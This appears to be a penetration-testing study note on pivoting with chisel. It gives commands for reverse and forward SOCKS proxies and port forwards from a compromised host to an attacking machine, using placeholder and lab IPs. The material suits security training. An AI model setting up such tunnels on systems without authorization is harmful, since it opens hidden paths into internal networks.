>Chisel uses a **SOCKS5** proxy

We'll look at two uses of chisel in this task (a SOCKS proxy and a port forward)

## Reverse SOCKS Proxy

This connects from a compromised server to a listener waiting on our attacking machine.

- On our KALI:

```sh
# On our KALI
chisel server -p LISTEN_PORT --reverse &
```

- On the compromised host:

```sh
chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

---
## Forward SOCKS Proxy

Forward proxies are rarer than reverse proxies for the same reason that reverse shells are more common than bind shells; Generally speaking, egress firewalls (which handle outbound traffic) are less strict than ingress firewalls (which handle inbound connections).

- On the compromised host:

```sh
chisel server -p LISTEN_PORT --socks5
```

- On our KALI:

```sh
chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
# PROXY_PORT is the port that will be opened for the proxy.
```

For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.

---
## Remote Port Forward

A remote port forward occurs when we reconnect from a compromised target to create the forward.

- On our KALI:

```sh
chisel server -p LISTEN_PORT --reverse &
```

- On the compromised host:

```sh
chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```

`LOCAL_PORT` is the port we want to open on our own attacking machine to bind to the desired target port.


To use an old example, suppose our own IP is 172.16.0.20, the compromised server IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax to forward 172.16.0.10:22 to port 2222 on our attacking machine would be as follows:

```sh
chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

Reconnecting to our attacking machine, running as a chisel server, started with:

```sh
chisel server -p 1337 --reverse &
```

This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

---
## Local Port Forward

A local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target:

```sh
chisel server -p LISTEN_PORT
```

- On KALI:

```sh
chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our target), we could use:

```sh
chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```
